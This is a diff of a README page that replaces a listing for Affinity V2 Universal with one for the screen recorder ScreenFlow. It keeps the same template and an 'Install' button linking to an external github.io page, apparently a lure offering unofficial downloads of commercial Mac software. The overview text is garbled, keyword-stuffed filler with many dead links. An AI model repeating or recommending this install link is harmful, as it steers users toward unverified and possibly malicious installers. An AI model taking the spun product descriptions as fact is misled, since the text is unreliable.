@@ -1,57 +1,57 @@
-# Affinity V2 Universal OSX
+# ScreenFlow OSX
 
 <p align="center">
-  <img src="https://cdn.jim-nielsen.com/macos/512/affinity-photo-2-2023-02-14.png?rf=1024" width="200" alt="Affinity V2 Universal icon"/>
+  <img src="https://upload.wikimedia.org/wikipedia/en/1/19/ScreenFlow_icon_%282014%29.png" width="200" alt="ScreenFlow icon"/>
 </p>
 
 <p align="center">
 
-[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://clean-clouds.github.io/.github/affinityv2universal)
+[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://clean-clouds.github.io/.github/screenflow)
 
 </p>
 
 <p align="center">
-  <img src="https://cdn.serif.com/spotlight/content/554/67p/qw7/version-2-of-all-affinity-apps-launches-today--article-md@2x.jpg" alt="Affinity V2 Universal screenshot"/>
+  <img src="https://www.telestream.net/screenflow/images/ScreenFlow-Laptop.png" alt="ScreenFlow screenshot"/>
 </p>
 
 ---
 
 ## Overview
 
-Professional creative work requires comprehensive tools spanning photo editing, vector design, and page layout where expensive subscription software proves prohibitive demanding one-time purchase professional software providing complete creative capabilities without ongoing costs. <a href="#">Affinity V2 Universal</a> provides professional creative suite offering Photo for image editing, Designer for vector graphics, and Publisher for page layout serving creative professionals requiring comprehensive tools without subscription model. Universal binary runs natively on Apple Silicon through optimized code where leveraging M-series processor capabilities proves essential for performance maintaining efficient operation proving valuable for users with Apple Silicon Macs requiring native performance supporting resource-intensive creative work without performance limitations from non-optimized software reducing productivity through slow operations requiring waiting for processing completion disrupting creative flow requiring responsive software maintaining creative momentum without performance friction slowing creative exploration requiring immediate visual feedback responding quickly to adjustments enabling iterative creative refinement through rapid adjustment cycles. Non-destructive editing maintains original images through adjustment layers where preserving edit flexibility proves essential for creative exploration proving valuable for designers requiring reversible edits supporting creative experimentation without permanent changes enabling adjustment modifications without starting over rebuilding edits from scratch consuming creative energy and time requiring non-destructive workflow maintaining edit flexibility throughout creative process supporting iterative refinement adjusting previous decisions without destructive consequences limiting creative freedom.
+Screen recording requires capturing display content, editing recordings, and adding annotations where basic screen recorders lack editing features demanding integrated solution combining screen capture with video editing supporting complete screencast production. <a href="#">ScreenFlow</a> provides professional screen recorder offering multi-source capture, built-in editing, and motion graphics serving content creators requiring complete screencasting beyond simple capture tools. Multi-source recording captures screen, camera, and audio simultaneously through parallel input capture where recording multiple sources proves essential for tutorial videos maintaining synchronized media proving valuable for educators or trainers requiring picture-in-picture setups supporting engaging presentations without post-production source synchronization consuming time aligning separate recordings manually requiring precise audio-video sync maintaining temporal alignment across multiple media sources preventing lip-sync issues or timing mismatches from unsynchronized source captures requiring simultaneous recording maintaining perfect synchronization across display capture, webcam footage, and audio tracks enabling immediate editing without time-consuming synchronization procedures aligning separately recorded <a href="#">elements</a>. Built-in editing provides timeline editing within recording application through integrated editor where refining recordings proves essential for polished output maintaining production efficiency proving valuable for creators requiring video editing supporting recording refinement without external video editors disrupting workflow requiring application switching consuming attention managing multiple applications fragmenting production workflow requiring unified recording-editing environment enabling seamless transition from capture to editing maintaining consistent interface throughout production process supporting efficient video creation within single integrated application consolidating recording and editing workflows.
 
-Format compatibility imports Photoshop files through PSD support where working with existing assets proves essential for workflow integration proving valuable for designers transitioning from Adobe or collaborating with Photoshop users requiring file interchange supporting team collaboration without format conversion consuming time or causing element loss from imperfect translation creating design inconsistencies requiring manual correction consuming effort maintaining design fidelity during format conversion. Professional photo editing provides comprehensive retouching through advanced tools where enhancing photos proves essential for professional results proving valuable for photographers requiring capable editing supporting portrait retouching, landscape enhancement, or commercial product photography requiring sophisticated editing capabilities beyond basic adjustments maintaining high-quality output meeting professional standards demanding refined editing results matching commercial photography expectations requiring professional-grade editing tools supporting systematic photo enhancement workflows producing publication-ready images. Vector design creates scalable graphics through precision vector tools where designing logos, icons, or illustrations proves essential for resolution-independent artwork proving valuable for designers requiring vector graphics supporting diverse output from small icons through large format prints maintaining crisp quality at any size without pixelation from raster scaling requiring vector approach ensuring optimal quality regardless of output dimensions supporting versatile graphic design applications requiring scalable artwork.
+Annotations add callouts, highlights, or arrows through annotation tools where emphasizing screen elements proves essential for instructional clarity maintaining viewer focus proving valuable for instructors requiring visual emphasis supporting clear instruction directing attention to relevant screen areas without ambiguous instruction confusing viewers about reference locations requiring visual indicators highlighting important elements guiding viewer attention systematically through instructional content ensuring comprehension through clear visual communication indicating specific interface elements, buttons, or controls referenced in narration eliminating confusion from unclear spatial references requiring precise visual indication pointing to exact screen locations discussed in instruction. Motion graphics create animated titles or lower thirds through built-in graphics where enhancing production value proves essential for professional appearance proving valuable for creators requiring motion graphics supporting polished video production without external motion graphics tools consuming time learning specialized applications requiring integrated graphics enabling efficient title animation, text overlays, or graphic elements enhancing video professionalism through motion graphics integrated within recording application maintaining efficient workflow without separate graphics software fragmenting production across multiple applications. Transitions smooth scene changes through transition effects where professional editing proves essential for seamless videos proving valuable for creators requiring polished transitions supporting professional video flow without abrupt cuts disrupting viewing experience requiring smooth scene transitions maintaining video continuity through professional transition effects connecting scenes smoothly creating polished video presentation matching professional production standards expected in commercial video content requiring professional editing capabilities within recording application.
 
-Page layout designs multi-page publications through professional layout tools where creating magazines, books, or marketing materials proves essential for publication production proving valuable for designers requiring complete publishing supporting systematic document design from initial concept through final production maintaining organized layout workflows coordinating text, images, and graphics creating professional publications meeting industry standards requiring sophisticated layout capabilities supporting complex multi-page documents with professional typography and design.
+Export presets optimize videos for various platforms through ready-made export settings where producing platform-specific videos proves essential for distribution proving valuable for creators requiring optimized export supporting YouTube, Vimeo, or other platforms without understanding technical export parameters requiring preset configurations producing properly encoded videos matching platform specifications ensuring optimal playback quality on target platforms without manual export configuration requiring technical knowledge determining appropriate codecs, bitrates, or resolutions matching platform requirements enabling efficient export through preset selection producing platform-optimized videos instantly.
 
 ---
 
 ## Key Features
 
-- <a href="#">Universal</a> binary running natively Apple Silicon Intel
-- Non-destructive <a href="#">editing</a> maintaining original images adjustment layers
-- <a href="#">Format</a> compatibility importing Photoshop files PSD support
-- Professional <a href="#">photo</a> editing comprehensive retouching advanced tools
-- <a href="#">Vector</a> design creating scalable graphics precision tools
-- Page <a href="#">layout</a> designing multi-page publications professional tools
-- <a href="#">Creative</a> suite comprehensive design capabilities unified platform
-- One-time <a href="#">purchase</a> providing professional tools without subscription
-- <a href="#">Apple</a> Silicon optimization leveraging M-series performance native
+- <a href="#">Multi-source</a> recording capturing screen camera audio simultaneously
+- Built-in <a href="#">editing</a> providing timeline editing integrated within application
+- <a href="#">Annotations</a> adding callouts highlights arrows visual emphasis
+- Motion <a href="#">graphics</a> creating animated titles lower thirds built-in
+- <a href="#">Transitions</a> smoothing scene changes professional effects
+- Export <a href="#">presets</a> optimizing videos platforms ready-made settings
+- <a href="#">Screen</a> capture recording display content high quality
+- Audio <a href="#">mixing</a> balancing multiple audio tracks comprehensive
+- <a href="#">Professional</a> screencasting combining recording editing unified workflow
 
 ---
 
 <p align="center">
-  <img src="https://cdn.serif.com/spotlight/content/0l9/259/6zk/photo-saved-layer-states-macos--article-sm@2x.jpg" alt="Affinity V2 Universal screenshot"/>
+  <img src="https://9to5mac.com/wp-content/uploads/sites/6/2017/08/screenflow-71.jpg?quality=82&strip=all&w=1600" alt="ScreenFlow screenshot"/>
 </p>
 
 ---
 
 ## Additional Information
 
-Affinity V2 Universal OSX excels for professional creative work without subscriptions. Universal binary provides native Apple Silicon performance maintaining efficient resource-intensive creative operation.
+ScreenFlow OSX excels for professional screen recording. Multi-source capture records screen, camera, and audio simultaneously maintaining perfect synchronization without post-production alignment.
 
-Non-destructive editing supports creative flexibility. Maintaining original images enables reversible edits supporting experimentation without permanent changes limiting creative freedom.
+Built-in editing streamlines production workflow. Integrated timeline editor enables recording refinement within capture application without external video editors.
 
-Format compatibility enables workflow collaboration. PSD import supports working with Photoshop users or existing assets without conversion hassles.
+Annotations enhance instructional clarity. Visual callouts, highlights, and arrows emphasize important screen elements directing viewer attention effectively.
 
 ---
